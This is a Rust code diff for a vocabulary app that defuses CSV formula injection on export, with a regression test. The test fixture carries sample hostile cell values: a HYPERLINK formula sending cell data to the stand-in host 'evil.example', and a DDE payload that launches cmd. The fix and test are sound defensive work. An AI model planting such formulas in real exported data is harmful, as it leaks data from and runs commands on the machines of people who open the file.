@@ -731,16 +731,33 @@ fn validate_group(group: Option<&str>) -> Result<Option<String>, VocabError> {
     Ok(Some(group.to_string()))
 }
 
-/// Quote a CSV field when it contains a comma, quote or newline.
+/// Quote a CSV field when it contains a comma, quote or newline, and disarm a
+/// field a spreadsheet would read as a formula.
 ///
 /// The one CSV quoting rule in the project, shared with the attempt log's
 /// export: two spellings of "escape a field" is one more than a spreadsheet
 /// will forgive.
+///
+/// **This is a safety boundary, not only a formatting one** — the quoting half
+/// is RFC 4180 and the other half is not, so do not simplify it back. Excel,
+/// LibreOffice Calc, Google Sheets and Numbers treat a cell that *starts* with
+/// `=`, `+`, `-`, `@`, a tab or a carriage return as a formula, and CSV quoting
+/// is stripped on load: `"=1+1"` is still the formula `=1+1`. Since the
+/// vocabulary list holds learner-supplied text — including text that arrived
+/// from somebody else's shared list through [`VocabStore::import_json`] — an
+/// exported cell would otherwise be live code in whoever opens it. A leading
+/// apostrophe is the spreadsheet convention for "this is text"; it is stripped
+/// on display and costs an ordinary field nothing.
 pub fn csv_field(value: &str) -> String {
+    let value = if value.starts_with(['=', '+', '-', '@', '\t', '\r']) {
+        format!("'{value}")
+    } else {
+        value.to_string()
+    };
     if value.contains([',', '"', '\n', '\r']) {
         format!("\"{}\"", value.replace('"', "\"\""))
     } else {
-        value.to_string()
+        value
     }
 }
 
@@ -1144,6 +1161,58 @@ mod tests {
         assert!(lines[0].starts_with("text,pinyin,meaning"));
         assert!(lines[1].contains("\"good, \"\"fine\"\"\""));
         assert!(lines[1].contains("\"Lesson, 3\""));
+    }
+
+    #[test]
+    fn a_field_a_spreadsheet_would_run_is_defused() {
+        // The reported bug, through the real route in: a shared list is
+        // imported, exported as CSV for a spreadsheet, and the formula in it
+        // runs in *that* reader. Quoting is not neutralising — CSV quoting is
+        // stripped on load, so `"=1+1"` is still a formula — and the pinyin and
+        // meaning columns below have no comma of their own, so they would not
+        // even be quoted.
+        //
+        // Imported rather than added, because `add_entry` validates `text` and
+        // this is exactly the text it refuses: `import_json` takes the fields as
+        // they were written, which is the whole point of it being a boundary.
+        let hostile = serde_json::json!({
+            "version": FORMAT_VERSION,
+            "nextId": 2,
+            "groups": ["-2+3"],
+            "entries": [{
+                "id": 1,
+                "text": "=HYPERLINK(\"http://evil.example/?d=\"&A1,\"click\")",
+                "pinyin": "+1+1",
+                "meaning": "@SUM(1+1)*cmd|' /c calc'!A0",
+                "group": "-2+3",
+                "addedAt": "2026-01-01T00:00:00Z",
+            }],
+        });
+        let mut store = VocabStore::in_memory();
+        store.import_json(&hostile.to_string(), false).unwrap();
+        let csv = store.export_csv();
+        let row = csv.lines().nth(1).unwrap();
+
+        // Every dangerous field is preceded by the text marker, and the tab and
+        // carriage return spellings are markers too. The first is quoted as well
+        // — it contains commas of its own — which is why the marker is asserted
+        // on the field rather than on the start of the line.
+        assert!(row.contains("'=HYPERLINK"), "the character is defused: {row}");
+        assert!(row.contains("'+1+1"), "the pinyin is defused: {row}");
+        assert!(row.contains("'@SUM"), "the meaning is defused: {row}");
+        assert!(row.contains("'-2+3"), "the group is defused: {row}");
+        assert_eq!(csv_field("=1+1"), "'=1+1");
+        assert_eq!(csv_field("\tcmd"), "'\tcmd");
+        assert_eq!(csv_field("\rcmd"), "\"'\rcmd\"");
+
+        // An ordinary field is untouched: the marker is not a tax on everything.
+        assert_eq!(csv_field("好"), "好");
+        assert_eq!(csv_field(""), "");
+        assert_eq!(csv_field("good, \"fine\""), "\"good, \"\"fine\"\"\"");
+        // And a field that only *contains* a dangerous character is safe: the
+        // formula rule is about the first character, which is what a spreadsheet
+        // looks at.
+        assert_eq!(csv_field("a=1"), "a=1");
     }
 
     // ---- ordering ---------------------------------------------------------
